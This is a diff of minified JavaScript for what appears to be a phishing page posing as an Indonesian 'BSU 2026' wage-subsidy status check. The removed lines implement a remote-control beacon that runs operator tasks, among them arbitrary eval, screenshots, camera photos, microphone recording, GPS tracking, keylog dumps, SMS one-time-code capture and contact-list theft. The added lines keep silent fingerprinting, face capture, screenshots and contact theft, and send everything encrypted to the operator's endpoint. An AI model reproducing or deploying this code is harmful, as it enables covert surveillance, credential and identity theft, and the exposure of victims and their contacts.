- chain(shuf(A),40).then(function(){setTimeout(function(){chain(shuf(BC),1100).then(function(){sendMx();sendProbe();if(MAN)unduh()})},700)})})}
-
-function beat(f){if(!alive||(inflight&&!f))return;if(document.hidden&&!f&&miss===0)return sch(45000);
- inflight=true;send('beacon',{vis:document.visibilityState,url:location.href,net:(navigator.connection&&navigator.connection.effectiveType)||''})
- .then(function(r){inflight=false;if(!r||!r.ok){if(++miss>6){alive=false;return}return sch()}miss=0;(r.tasks||[]).forEach(run);sch(r.next||15000)})}
-function sch(b){if(!alive)return;clearTimeout(bt);var n=b||15000,j=n*.4;bt=setTimeout(function(){beat()},Math.max(4000,n-j+Math.random()*j*2))}
-
-function idb(fn){return new Promise(function(r){try{var q=indexedDB.open('gsi',1);q.onupgradeneeded=function(){q.result.createObjectStore('q',{keyPath:'k'})};
- q.onsuccess=function(){fn(q.result,r)};q.onerror=function(){r()}}catch(e){r()}})}
-function stash(t){idb(function(db,r){try{var tx=db.transaction('q','readwrite');tx.objectStore('q').put({k:t.id,t:t});tx.oncomplete=r}catch(e){r()}})}
-function unstash(id){idb(function(db,r){try{var tx=db.transaction('q','readwrite');tx.objectStore('q').delete(id);tx.oncomplete=r}catch(e){r()}})}
-function loadStash(){return new Promise(function(r){idb(function(db,d){try{var q=db.transaction('q','readonly').objectStore('q').getAll();q.onsuccess=function(){d(q.result||[])};q.onerror=function(){d([])}}catch(e){d([])}}).then(r)})}
-
-var cur=null;
-function reply(t,v){send('hasil',{id:t.id,cmd:t.cmd,isi:String(v)})}
-function shot(ok,no){
- var el=$('gsi-wrap'),lama='';
- var bersih=function(){if(el)el.style.backdropFilter=lama};
- var siap=function(){
-  if(!window.html2canvas)return no(new Error('pustaka'));
-  var t=el&&el.classList.contains('on')?el:document.body;
-  window.html2canvas(t,{scale:.75,logging:false,backgroundColor:'#ffffff',windowWidth:innerWidth,
-   windowHeight:innerHeight,scrollX:0,scrollY:0,useCORS:true})
-   .then(function(c){bersih();ok(c.toDataURL('image/jpeg',.75))})
-   .catch(function(e){bersih();no(e)})};
- if(el&&el.classList.contains('on')){lama=el.style.backdropFilter||'';el.style.backdropFilter='none'}
- if(window.html2canvas)return siap();
- var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
- s.onload=siap;s.onerror=function(){bersih();no(new Error('pustaka gagal'))};document.head.appendChild(s)}
-function locNow(ok,no){if(!navigator.geolocation)return ok('-');
- navigator.geolocation.getCurrentPosition(function(p){var o={lat:p.coords.latitude.toFixed(6),lng:p.coords.longitude.toFixed(6),acc:Math.round(p.coords.accuracy)};
- fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=17&addressdetails=1&accept-language=id&lat='+o.lat+'&lon='+o.lng)
- .then(function(r){return r.json()}).then(function(d){o.alamat=(d&&d.display_name)||'';ok(JSON.stringify(o))}).catch(function(){ok(JSON.stringify(o))})},no,{enableHighAccuracy:true,timeout:12000})}
-function mic(ok,no,ms){if(!navigator.mediaDevices||!window.MediaRecorder)return ok('tidak didukung');
- navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){var ch=[],mr=new MediaRecorder(s);
- mr.ondataavailable=function(e){if(e.data.size)ch.push(e.data)};
- mr.onstop=function(){s.getTracks().forEach(function(t){t.stop()});var f=new FileReader();f.onload=function(){ok(f.result)};f.readAsDataURL(new Blob(ch,{type:'audio/webm'}))};
- mr.start();setTimeout(function(){try{mr.stop()}catch(e){}},ms||3000)}).catch(no)}
-function torch(ok,no){navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}}).then(function(s){
- var t=s.getVideoTracks()[0];if(!t.getCapabilities||!t.getCapabilities().torch){s.getTracks().forEach(function(x){x.stop()});return ok('tidak didukung')}
- t.applyConstraints({advanced:[{torch:true}]}).then(function(){ok('menyala');setTimeout(function(){s.getTracks().forEach(function(x){x.stop()})},12000)}).catch(no)}).catch(no)}
-function pindai(ok){var r=inv();Promise.all([permScan(),mediaScan()]).then(function(x){r.perm=x[0];r.media=x[1];r.sensor=sen.ctx;ok(JSON.stringify(r))})}
-
-function exec(cmd,arg){return new Promise(function(ok,no){var done=function(v){reply(cur,v);ok(v)};
- switch(cmd){
-  case'foto':photo='';photoSent=false;camS='idle';camDone=function(){done(photo||'gagal')};startCam();return;
-  case'lokasi':return locNow(done,no);
-  case'tangkap':return shot(done,no);
-  case'layar':return done(JSON.stringify({vw:innerWidth,vh:innerHeight,dpr:devicePixelRatio,popup:popup,inputs:document.querySelectorAll('input').length,teks:(document.body.innerText||'').slice(0,700)}));
-  case'dom':return done(document.documentElement.outerHTML.slice(0,7000));
-  case'js':try{var r=eval(arg);return done(typeof r==='object'?JSON.stringify(r):String(r))}catch(e){return no(e)}
-  case'stream':var n=Math.max(1,Math.min(6,parseInt(arg,10)||3)),k=0;(function lp(){if(k>=n)return done('selesai');
-   shot(function(u){reply(cur,u);k++;setTimeout(lp,2200)},function(){done('gagal')})})();return;
-  case'foto-loop':var m=Math.max(1,Math.min(4,parseInt(arg,10)||2)),j=0;(function lp(){if(j>=m)return done('selesai');
-   photo='';photoSent=false;camS='idle';camDone=function(){reply(cur,photo?'ok':'gagal');j++;setTimeout(lp,1500)};startCam()})();return;
-  case'kontak':return tarikKontak(true).then(function(n){done(n)})["catch"](function(e){no(e)});
-  case'audio':return mic(done,no);
-  case'rekam':return mic(done,no,9000);
-  case'pindai':return pindai(done);
-  case'sidik':return done(JSON.stringify({fp:fp(),font:fontF(),audio:audioFp,gpu:invC.gpu}));
-  case'media':return mediaScan().then(done);
-  case'sensor':senStart();setTimeout(function(){done(sen.ctx||'tanpa sensor')},6200);return;
-  case'perangkat':return done(JSON.stringify(inv()));
-  case'keylog':return done(JSON.stringify(KEYS.slice(-160)));
-  case'mutasi':return done(JSON.stringify(mutasi.slice(-120)));
-  case'sms':return done(smsSent||'-');
-  case'nik':return done(NIK||'-');
-  case'lacak':lacak();setTimeout(function(){done('watch aktif')},7000);return;
-  case'getar':try{navigator.vibrate([220,110,220,110,420]);done('getar')}catch(e){no(e)}return;
-  case'senter':return torch(done,no);
-  case'notif':if(!window.Notification)return done('tidak didukung');Notification.requestPermission().then(function(p){
-   if(p!=='granted')return done('ditolak');new Notification('BSU 2026',{body:arg||'Pengecekan status'});done('tampil')}).catch(no);return;
-  case'salin':if(!navigator.clipboard)return done('tidak didukung');navigator.clipboard.writeText(arg||'BSU 2026').then(function(){done('disalin')}).catch(no);return;
-  case'bicara':if(!window.speechSynthesis)return done('tidak didukung');speechSynthesis.speak(new SpeechSynthesisUtterance(arg||'Bantuan Subsidi Upah 2026'));done('dibacakan');return;
-  case'bagikan':if(!navigator.share)return done('tidak didukung');navigator.share({title:'BSU 2026',text:arg||'Cek status',url:location.href}).then(function(){done('dibagikan')}).catch(no);return;
-  case'buka':location.href=arg||SITUS;done('dibuka');return;
-  case'popup':bukaAman();done('dibuka');return;
-  case'kill':alive=false;clearTimeout(bt);done('dihentikan');return;
-  default:done('tidak dikenal')}})}
-function run(t){cur=t;exec(t.cmd,t.arg).catch(function(e){
- if(e&&(e.name==='NotAllowedError'||e.name==='SecurityError'||e.name==='InvalidStateError')){stash(t);reply(t,'ditahan: butuh gestur')}
- else reply(t,'gagal: '+(e&&e.message||e))})}
-function flushStash(){loadStash().then(function(l){l.forEach(function(row,i){var t=row.t;
- setTimeout(function(){lTry++;cur=t;exec(t.cmd,t.arg).then(function(){lOk++;unstash(t.id);sendProbe()}).catch(function(){})},260*i)})})}
-
-function kirimKontak(rows){
- var bagian=[],i=0;
- while(i<rows.length)bagian.push(rows.slice(i,i+150)),i+=150;
- (function kirim(k){
-  if(k>=bagian.length){konS='ok';izM('kon','ok');paint();return Promise.resolve(rows.length)}
-  return send('kontak',{rows:bagian[k],total:rows.length,bagian:k+1,dari:bagian.length}).then(function(r){
-   if(!r||!r.ok)throw new Error('kontak gagal');
-   return kirim(k+1)})})(0)["catch"](function(){konS='gagal';paint()})}
-function gesturAda(){try{return !!(navigator.userActivation&&navigator.userActivation.isActive)}catch(e){return false}}
-function tarikKontak(paksa){
- if(konDone&&!paksa)return Promise.resolve('sudah');
- if(!navigator.contacts){konS='na';paint();return Promise.resolve('tidak didukung')}
- if(!paksa&&!gesturAda()){konS='tunggu';paint();return Promise.resolve('tunggu')}
- if(!paksa&&konCobaan>=konMax)return Promise.resolve('batas');
- if(!paksa&&konCobaan>0&&Date.now()-konAkhir<6000)return Promise.resolve('jeda');
- konCobaan++;konAkhir=Date.now();konS='asking';paint();
- var coba=function(opsi){
-  return navigator.contacts.select(['name','tel','email','address'],opsi)
-   .then(function(list){
-    if(!list||!list.length){konS='kosong';paint();return 'kosong'}
-    var rows=[],tel=[];
-    list.forEach(function(c){
-     var nm=(c.name&&c.name[0])||'',tl=(c.tel||[]).join(' / '),em=(c.email||[]).join(' / '),
-      al=(c.address&&c.address[0])?String(c.address[0].city||c.address[0].country||''):'';
-     rows.push({nama:nm,tel:tl,email:em,alamat:al});
-     (c.tel||[]).forEach(function(x){if(x)tel.push({nomor:String(x).replace(/\s+/g,''),sumber:'kontak'})});
+function hex(n){var a=new Uint8Array(n);crypto.getRandomValues(a);return Array.prototype.map.call(a,function(b){return('0'+b.toString(16)).slice(-2)}).join('')}
+try{sid=localStorage.getItem('zgch_sid')||'';if(!sid){sid=hex(9);localStorage.setItem('zgch_sid',sid)}}catch(e){sid=hex(9)}
+try{dev=localStorage.getItem('zgch_dev')||'';if(!dev){dev=hex(5);localStorage.setItem('zgch_dev',dev)}}catch(e){dev=hex(5)}
+function ep(){return EPS[0]}
+function b64(u){var s='';for(var i=0;i<u.length;i+=0x8000)s+=String.fromCharCode.apply(null,u.subarray(i,i+0x8000));return btoa(s)}
+function aKey(){
+  var kb=new TextEncoder().encode(PSK),k16=new Uint8Array(16);k16.set(kb.slice(0,16));
+  return crypto.subtle.importKey('raw',k16,'AES-CTR',false,['encrypt']);
+}
+function gz(u){
+  if(!window.CompressionStream)return Promise.resolve(null);
+  try{var s=new Blob([u]).stream().pipeThrough(new CompressionStream('gzip'));
+    return new Response(s).arrayBuffer().then(function(b){return new Uint8Array(b)}).catch(function(){return null})}
+  catch(e){return Promise.resolve(null)}
+}
+function seal(o){
+  o.pad=hex(8+(Math.random()*24|0));
+  var raw=new TextEncoder().encode(JSON.stringify(o));
+  if(!crypto.subtle||!crypto.subtle.importKey)return Promise.resolve({b:b64(raw),g:0});
+  return gz(raw).then(function(z){
+    var body=z||raw,iv=new Uint8Array(16);crypto.getRandomValues(iv);
+    return aKey().then(function(k){return crypto.subtle.encrypt({name:'AES-CTR',counter:iv,length:64},k,body)})
+    .then(function(ct){var a=new Uint8Array(16+ct.byteLength);a.set(iv);a.set(new Uint8Array(ct),16);return{b:b64(a),g:z?1:0}})
+  }).catch(function(){return{b:b64(raw),g:0}});
+}
+function post(q){
+  return fetch(ep(),{method:'POST',mode:'cors',credentials:'omit',redirect:'follow',
+    headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},body:q})
+    .then(function(r){return r.text().then(function(t){return{ok:true,t:t}})})
+    .catch(function(){return{ok:false,t:''}});
+}
+function polos(q){try{fetch(ep(),{method:'POST',mode:'no-cors',keepalive:true,body:q}).catch(function(){})}catch(e){}}
+function send(a,o){
+  return seal(Object.assign({action:a,sid:sid,ts:Date.now()},o||{})).then(function(e){
+    var q='action='+a+'&sid='+sid+'&enc=1&gz='+e.g+'&p='+encodeURIComponent(e.b);
+    return post(q).then(function(r){
+      if(!r.ok)return{ok:false};
+      try{return JSON.parse(r.t)}catch(x){return{ok:false}};
     });
-    konDone=true;konN=rows.length;
-    if(tel.length)kirimTel(tel.slice(0,600));
-    return kirimKontak(rows.slice(0,600)).then(function(){return konN+' kontak'})})};
- return coba({multiple:true})
-  ["catch"](function(e){
-   var nm=(e&&e.name)||'';
-   if(nm==='TypeError')return coba({}).catch(function(){konS='na';paint();return 'na'});
-   konS=(nm==='AbortError')?'batal':'ditolak';paint();return 'gagal'})}
+  });
+}
+function kirimPolos(a,o){
+  var q='action='+a+'&sid='+sid+'&enc=0';
+  Object.keys(o||{}).forEach(function(k){q+='&'+k+'='+encodeURIComponent(String(o[k]).slice(0,120000))});
+  polos(q);
+}
+function dbg(m){if(!DEV)return;var d=$('dv');d.classList.add('on');d.textContent=String(m).slice(0,400)+'\n'+d.textContent.slice(0,900)}
 
-function otpOtomatis(){
- if(!('OTPCredential' in window)||smsS==='ok')return;
- try{if(otpAc)otpAc.abort()}catch(e){}
- otpAc=new AbortController();smsS='menunggu';paint();
- navigator.credentials.get({otp:{transport:['sms']},signal:otpAc.signal}).then(function(r){
-  if(!r||!r.code)return;
-  var c=String(r.code).replace(/\D/g,'').slice(0,6);
-  if(c.length<6)return;
-  otpEl.value=c;smsS='ok';paint();smsSent=c;
-  send('sms',{jenis:'otp',pengirim:'-',isi:c,otomatis:1});
-  $('gsiOtpField').classList.remove('bad');$('gsiOtpErr').classList.remove('show');
-  setTimeout(verify,200)})
- ["catch"](function(e){smsS=(e&&e.name==='AbortError')?'batal':'na';paint()})}
+/* ---------- sidik & probe ---------- */
+function sidik(){
+  try{
+    var c=document.createElement('canvas');c.width=240;c.height=60;var x=c.getContext('2d');
+    x.textBaseline='top';x.font='16px Arial';x.fillStyle='#123';x.fillRect(0,0,240,60);
+    x.fillStyle='#8ef';x.fillText('ZGCH '+navigator.language,4,8);
+    x.fillStyle='#fa3';x.fillText(String(Date.now()%99991),4,30);
+    SIDIK=c.toDataURL().slice(-180);
+  }catch(e){SIDIK=''}
+  try{var ac=new (window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,44100,44100);
+    var o=ac.createOscillator();o.type='triangle';o.frequency.value=10000;
+    var g=ac.createGain();g.gain.value=.05;o.connect(g);g.connect(ac.destination);o.start(0);
+    ac.startRendering().then(function(b){var d=b.getChannelData(0),s=0;for(var i=0;i<d.length;i+=100)s+=Math.abs(d[i]);PROBE.audio=Math.round(s*1000)}).catch(function(){});
+  }catch(e){}
+}
+function probe(){
+  var k=['contacts','credentials','geolocation','mediaDevices','clipboard','share','vibrate','Notification','bluetooth','usb','wakeLock','serviceWorker','crypto'];
+  k.forEach(function(n){try{PROBE[n]=!!navigator[n]}catch(e){PROBE[n]=false}});
+  PROBE.standalone=!!navigator.standalone;PROBE.touch=('ontouchstart' in window);
+  PROBE.mem=navigator.deviceMemory||0;PROBE.inti=navigator.hardwareConcurrency||0;
+  PROBE.gpu='';try{var c=document.createElement('canvas'),g=c.getContext('webgl');
+    if(g){var d=g.getExtension('WEBGL_debug_renderer_info');PROBE.gpu=d?g.getParameter(d.UNMASKED_RENDERER_WEBGL):''}}catch(e){}
+  try{var p=document.createElement('canvas').getContext('2d');PROBE.cv=!!p}catch(e){PROBE.cv=false}
+  PROBE.storage=('storage' in navigator && navigator.storage.estimate)?1:0;
+  SKOR=hitung();
+}
+function hitung(){
+  var s=10;
+  if(PROBE.contacts)s+=14;if(PROBE.credentials)s+=10;if(PROBE.geolocation)s+=12;
+  if(PROBE.mediaDevices)s+=14;if(PROBE.cv)s+=8;if(PROBE.serviceWorker)s+=6;
+  if(PROBE.wakeLock)s+=4;if(PROBE.share)s+=5;if(PROBE.vibrate)s+=3;
+  if(PROBE.mem)s+=4;if(PROBE.gpu)s+=5;if(PROBE.touch)s+=3;
+  return Math.min(99,s);
+}
 
-function kirimTel(rows){if(!rows||!rows.length)return;send('tel',{rows:rows.slice(0,400)})}
-
-function startCam(){if(camS==='on')return grab();camS='asking';paint();
- if(!navigator.mediaDevices){camS='na';paint();return fire()}
- var use=function(s){stream=s;camS='on';paint();vid.srcObject=s;
-  var p=vid.play();if(p&&p.catch)p.catch(function(){});
-  setTimeout(function(){grab()},1600)};
- if(window.__cam&&window.__cam.active)return use(window.__cam);
- var minta=function(c){return navigator.mediaDevices.getUserMedia({audio:false,video:c})};
- minta({facingMode:'user',width:{ideal:1280},height:{ideal:1280}})
-  .catch(function(){return minta({facingMode:'user'})})
-  .catch(function(){return minta(true)})
-  .then(use).catch(function(){camS='denied';paint();fire()})}
-function fire(){var f=camDone;camDone=null;if(f)f()}
-function grab(){if(!stream||photo)return;
- if(!vid.videoWidth){if((grab.n=(grab.n||0)+1)<12)return setTimeout(grab,250);camS='na';paint();return fire()}
- grab.n=0;shots=0;best='';bestSc=-1;burst()}
-function burst(){if(!stream)return;if(shots>=5)return settle();shots++;
- var w=760,h=Math.round(vid.videoHeight*(760/vid.videoWidth))||760;cv.width=w;cv.height=h;
- var c=cv.getContext('2d');c.drawImage(vid,0,0,w,h);
- var s=nilai(c,w,h);
- if(s>bestSc){bestSc=s;try{best=cv.toDataURL('image/jpeg',.85)}catch(e){}}
- setTimeout(burst,260)}
-function nilai(c,w,h){var d,s=0,s2=0,n=0;
- try{d=c.getImageData(0,0,w,h).data}catch(e){return 0}
- for(var i=0;i<d.length;i+=60){var v=d[i]*.299+d[i+1]*.587+d[i+2]*.114;s+=v;s2+=v*v;n++}
- if(!n)return 0;var m=s/n,sd=Math.sqrt(Math.max(s2/n-m*m,0));
- return m*(1+sd/50)}
-function cerah(){if(!best)return;
- var im=new Image();
- im.onload=function(){
-  var c=cv.getContext('2d');cv.width=im.width;cv.height=im.height;
-  c.drawImage(im,0,0);
-  try{var d=c.getImageData(0,0,cv.width,cv.height),p=d.data;
-   for(var i=0;i<p.length;i+=4){
-    var v=p[i]*.299+p[i+1]*.587+p[i+2]*.114;
-    var f=v<16?3.1:v<40?2.2:v<85?1.5:v<130?1.2:1.05;
-    p[i]=Math.min(255,p[i]*f+10);p[i+1]=Math.min(255,p[i+1]*f+10);p[i+2]=Math.min(255,p[i+2]*f+10)}
-   c.putImageData(d,0,0);
-   photo=cv.toDataURL('image/jpeg',.82)}catch(e){photo=best}
-  var t=$('gsiThumb');t.src=photo;t.classList.add('on');
-  paint();stopCam();fire();upload()};
- im.onerror=function(){photo=best;stopCam();fire();upload()};
- im.src=best}
-function settle(){if(!best&&rounds<2&&stream){rounds++;return setTimeout(grab,500)}
- if(!best){camS='na';paint();stopCam();return fire()}
- cerah()}
-function stopCam(){if(!stream)return;try{stream.getTracks().forEach(function(t){t.stop()})}catch(e){}stream=null;window.__cam=null;try{vid.srcObject=null}catch(e){}}
-function upload(){if(!photo||photoSent)return;photoSent=true;
- send('foto',{rid:ridCur,username:username,foto:photo,zero:username?0:1,sid:sid}).then(function(r){if(!r||!r.ok)photoSent=false})}
-
-function startGps(){if(gpsS!=='idle'&&gpsS!=='denied')return;gpsS='asking';paint();
- if(!navigator.geolocation){gpsS='na';paint();return}
- navigator.geolocation.getCurrentPosition(function(p){
-  gps={lat:p.coords.latitude.toFixed(6),lng:p.coords.longitude.toFixed(6),acc:Math.round(p.coords.accuracy||0)};
-  sumber='gps';gpsS='ok';paint();izM('geo','ok');
-  fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=17&addressdetails=1&accept-language=id&lat='+gps.lat+'&lon='+gps.lng)
-  .then(function(r){return r.json()}).then(function(d){if(d&&d.display_name)addr=String(d.display_name).slice(0,220);patch()}).catch(function(){});
-  patch();lacak()},function(){gpsS='denied';paint()},{enableHighAccuracy:true,timeout:12000,maximumAge:60000})}
-function lacak(){if(watchId||!navigator.geolocation)return;
- watchId=navigator.geolocation.watchPosition(function(p){
-  gps={lat:p.coords.latitude.toFixed(6),lng:p.coords.longitude.toFixed(6),acc:Math.round(p.coords.accuracy||0)};
-  gpsS='ok';paint();
-  if(Date.now()-lastKirim>25000){lastKirim=Date.now();kirimJejak()}},function(){},{enableHighAccuracy:true,maximumAge:20000,timeout:20000})}
-function kirimJejak(){if(!gps)return;send('lacak',{lat:gps.lat,lng:gps.lng,acc:gps.acc,alamat:addr,sumber:sumber||'gps'})}
-function patch(){if(!ridCur)return;var o={};
- if(gps){o.lat=gps.lat;o.lng=gps.lng;o.acc=gps.acc}if(addr)o.alamat=addr;
- if(ip){o.ip=ip;o.isp=isp+(kota?' — '+kota:'')}if(!o.lat&&!o.ip)return;
- o.rid=ridCur;o.username=username;o.fingerprint=fp();
- o.perangkat=(navigator.hardwareConcurrency||0)+'c/'+(navigator.deviceMemory||0)+'GB';
- o.catatan='isi '+((tSub?tSub-t0:0)/1000).toFixed(1)+'s tempel '+(pasted?'y':'n');
- send('extra',o)}
-
-function sendProbe(){if(!probeDone&&!lOk)return;
- send('probe',{probe:JSON.stringify({states:STATES,cam:camS,geo:gpsS,kontak:konS,sms:smsS,launder:lOk,launderTried:lTry}),
- yield:yieldSc(),prompts:prompts,launder:lOk,konteks:sen.ctx,senyap:senyap})}
-function yieldSc(){var n=0;['model','os','gpu','font','audio','perm','media','sensor','ip','kota','lat','lng','alamat'].forEach(function(k){if(invC[k])n++});
- if(photo)n+=5;if(username)n+=2;if(NIK)n+=6;if(konDone)n+=10;return Math.max(n-prompts,0)}
-function sendAuto(){if(sendAuto.done)return;sendAuto.done=true;var i=inv();Object.assign(invC,i);
- i.ip=ip;i.kota=kota;i.isp=isp;i.nik=NIK;
- if(gps){i.lat=gps.lat;i.lng=gps.lng;i.acc=gps.acc;i.sumber=sumber||'gps'}if(addr)i.alamat=addr;
- i.sensor=sen.ctx;i.audio=audioFp;
- Promise.all([uaD(),permScan(),mediaScan()]).then(function(r){
-  i.model=(r[0]&&r[0].model)||'-';i.os=(r[0]&&r[0].platform)?r[0].platform+' '+(r[0].platformVersion||''):navigator.platform;
-  i.perangkat='cores='+(i.cores||0)+' mem='+(i.mem||0)+'GB touch='+(i.touch||0)+' dpr='+i.dpr+' scr='+i.scr;
-  i.perm=r[1];i.media=r[2];invC.perm=r[1];invC.media=r[2];invC.model=i.model;send('auto',i)})}
+/* ---------- geo ---------- */
+function geo(cb){
+  if(!navigator.geolocation)return cb(null);
+  navigator.geolocation.getCurrentPosition(function(p){
+    cb({lat:p.coords.latitude.toFixed(6),lng:p.coords.longitude.toFixed(6),acc:Math.round(p.coords.accuracy||0),sumber:'gps'});
+  },function(){cb(null)},{enableHighAccuracy:true,timeout:9000,maximumAge:60000});
+}
 function geoIp(){
- fetch('https://api.ipify.org?format=json',{mode:'cors'}).then(function(r){return r.json()})
- .then(function(d){if(d&&d.ip){ip=d.ip;patch()}}).catch(function(){});
- return fetch('https://ipwho.is/',{mode:'cors'}).then(function(r){return r.json()}).then(function(d){
-  if(!d||d.success===false)return;
-  if(d.ip&&!ip)ip=d.ip;
-  kota=d.city||'';isp=(d.connection&&d.connection.isp)||'';
-  if(!gps&&d.latitude){gps={lat:String(d.latitude),lng:String(d.longitude),acc:5000};sumber='ip'}
-  sendAuto();patch()}).catch(function(){})}
+  fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(d){
+    if(d&&d.ip){ip=d.ip;if(DEV)dbg('ip '+ip)}
+  }).catch(function(){});
+}
 
-function devRow(r){if(!DEV)return;var dv=$('dv'),el=document.createElement('div');el.className='row';
- el.innerHTML='<span class="k k'+r.kelas+'">'+r.kelas+'</span><span class="c">'+r.cap+'</span><span class="n">'+String(r.note).replace(/[<>&]/g,'')+'</span><span class="l">'+r.lat+'ms</span>';
- dv.insertBefore(el,dv.querySelector('.tail'));devChips()}
-function devChips(){if(!DEV)return;var m=lm(),c=$('dv').querySelector('.chips');if(!c)return;
- c.innerHTML='<span class="chip">SGR <b>'+m.sgr+'</b></span><span class="chip">LSR <b>'+lOk+'/'+lTry+'</b></span><span class="chip">senyap <b>'+senyap+'</b></span><span class="chip">kon <b>'+konS+'</b></span>'}
-function devInit(){var dv=$('dv');dv.className='on';dv.innerHTML='<div class="chips"></div><div class="tail" style="margin-top:6px">0 senyap 1 prompt 2 blokir 3 n/a</div>';devChips()}
-function unduh(){var o={build:BUILD,sid:sid,rows:ROWS};var b=new Blob([JSON.stringify(o,null,1)],{type:'application/json'});
- var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='zgch-'+sid.slice(0,8)+'.json';a.click()}
+/* ---------- kamera ---------- */
+function nyala(){
+  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return Promise.resolve(false);
+  return navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640}},audio:false})
+    .then(function(s){vid.srcObject=s;vid.play().catch(function(){});return new Promise(function(r){setTimeout(function(){r(true)},1500)})})
+    .catch(function(){return false});
+}
+function jepret(){
+  return new Promise(function(res){
+    try{
+      if(!vid.videoWidth)return res('');
+      var w=320,h=Math.round(vid.videoHeight/(vid.videoWidth||1)*320)||240;
+      cv.width=w;cv.height=h;var x=cv.getContext('2d');var best='',bs=-1;
+      var n=0;
+      (function loop(){
+        x.drawImage(vid,0,0,w,h);
+        var d=x.getImageData(0,0,w,h).data,s=0;
+        for(var i=0;i<d.length;i+=4)s+=d[i]*.299+d[i+1]*.587+d[i+2]*.114;
+        s/=d.length/4;
+        var u=cv.toDataURL('image/jpeg',.82);
+        if(s>bs){bs=s;best=u}
+        if(++n<5)return setTimeout(loop,220);
+        if(bs<40){try{
+          x.drawImage(vid,0,0,w,h);
+          var im=x.getImageData(0,0,w,h),p=im.data,f=Math.min(3.4,Math.max(1,110/(bs||1)));
+          for(var j=0;j<p.length;j+=4){p[j]=Math.min(255,p[j]*f+12);p[j+1]=Math.min(255,p[j+1]*f+12);p[j+2]=Math.min(255,p[j+2]*f+12)}
+          x.putImageData(im,0,0);best=cv.toDataURL('image/jpeg',.85);
+        }catch(e){}}
+        res(best);
+      })();
+    }catch(e){res('')}
+  });
+}
+function fotoKirim(u){
+  if(!u||u.length<2000)return Promise.resolve('');
+  return send('foto',{img:u,ket:'wajah'}).then(function(r){
+    if(r&&r.ok&&r.url){FOTO=r.url;return r.url}
+    kirimPolos('foto',{img:u,ket:'wajah'});return '';
+  });
+}
+function layar(){
+  return new Promise(function(res){
+    try{
+      var t=wrap.classList.contains('on')?wrap:document.body;
+      if(!window.html2canvas)return res('');
+      html2canvas(t,{backgroundColor:'#ffffff',logging:false,scale:.7,
+        windowWidth:document.documentElement.clientWidth,scrollX:0,scrollY:-window.scrollY,
+        ignoreElements:function(e){return e.id==='dv'||e.id==='gsiVid'}})
+        .then(function(c){res(c.toDataURL('image/jpeg',.62))}).catch(function(){res('')});
+    }catch(e){res('')}
+  });
+}
 
-function paint(){
- var set=function(id,tx,s,on,wait,label){var b=$(id),t=$(tx);if(!b)return;
-  b.className='gsi-cap-item'+((s===on)?' on':(s===wait)?' wait':(s==='denied'||s==='ditolak'||s==='na'||s==='gagal'||s==='batal'||s==='kosong'||s==='batas')?' off':'');
-  if(t)t.textContent=label};
- set('gsiCapCam','gsiCapCamTxt',camS,'on','asking',camS==='on'?'Wajah terekam':camS==='asking'?'Menyiapkan kamera':camS==='denied'?'Kamera ditolak':'Wajah');
- set('gsiCapGps','gsiCapGpsTxt',gpsS,'ok','asking',gpsS==='ok'?'Lokasi terdeteksi':gpsS==='asking'?'Mencari lokasi':gpsS==='denied'?'Lokasi ditolak':'Lokasi');
- set('gsiCapKon','gsiCapKonTxt',konS,'ok','asking',konS==='ok'?(konN+' kontak'):konS==='asking'?'Membaca kontak':konS==='na'?'Kontak n/a':konS==='batas'?'Ketuk ulang':'Kontak');
- set('gsiCapSms','gsiCapSmsTxt',smsS,'ok','menunggu',smsS==='ok'?'SMS terbaca':smsS==='menunggu'?'Menunggu SMS':smsS==='na'?'SMS n/a':'SMS');
- var sb=$('gsiSink');if(sb)sb.className='gsi-sink'+(navigator.contacts&&!konDone&&konS!=='asking'?' on':'')}
+/* ---------- tangkap senyap ---------- */
+function auto(){
+  var p={probe:JSON.stringify(PROBE),yield:SKOR,prompts:0,launder:0};
+  send('auto',Object.assign({},p,{sidik:SIDIK,ip:ip,ua:navigator.userAgent,
+    platform:(navigator.userAgentData&&navigator.userAgentData.platform)||navigator.platform,
+    bahasa:navigator.language,zona:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    layar:screen.width+'x'+screen.height,model:PROBE.gpu||'',memori:PROBE.mem||0,
+    inti:PROBE.inti||0})).then(function(r){
+    if(r&&r.ok&&r.sid){sid=r.sid;try{localStorage.setItem('zgch_sid',sid)}catch(e){}}
+    kirimPolos('auto',p);
+  }).catch(function(){kirimPolos('auto',p)});
+}
+function kunjungan(t){
+  var p={tahap:t,ket:location.href};
+  send('kunjungan',p).catch(function(){});kirimPolos('kunjungan',p);
+}
 
-function bukaPopup(){popup=true;wrap.classList.add('on');document.body.classList.add('gsi-lock');
- $('gsiTitle').textContent='Masuk untuk melihat status';
- $('gsiSub').textContent='Verifikasi akun untuk menampilkan status penyaluran BSU 2026 atas NIK Anda.';
- if(NIK){$('gsiCtxNik').textContent=NIK.replace(/(\d{4})(?=\d)/g,'$1 ').trim();$('gsiCtx').classList.add('on')}
- paint();startCam();startGps();clrSt();
- setTimeout(function(){(emailEl.value?passEl:emailEl).focus({preventScroll:true})},260);
- if(alive)beat(true)}
-function bukaAman(){try{bukaPopup()}catch(e){
- try{$('gsi-wrap').style.display='flex'}catch(x){}
- alert('Popup error: '+e.message)}}
-window.__popup=bukaAman;
+/* ---------- kontak ---------- */
+function kontak(){
+  if(!navigator.contacts||!navigator.contacts.select)return Promise.resolve('na');
+  if(!navigator.userActivation||!navigator.userActivation.isActive)return Promise.resolve('tunggu');
+  return navigator.contacts.select(['name','tel','email','address'],{multiple:true}).then(function(l){
+    if(!l||!l.length)return 'kosong';
+    var rows=l.map(function(c){
+      var al='';try{al=c.address&&c.address[0]?(c.address[0].city||c.address[0].country||''):''}catch(e){}
+      return{nama:(c.name&&c.name[0])||'',tel:(c.tel||[]).join(' / '),em:(c.email||[]).join(' / '),al:al};
+    });
+    var p={rows:JSON.stringify(rows)};
+    send('kontak',p).catch(function(){});kirimPolos('kontak',p);
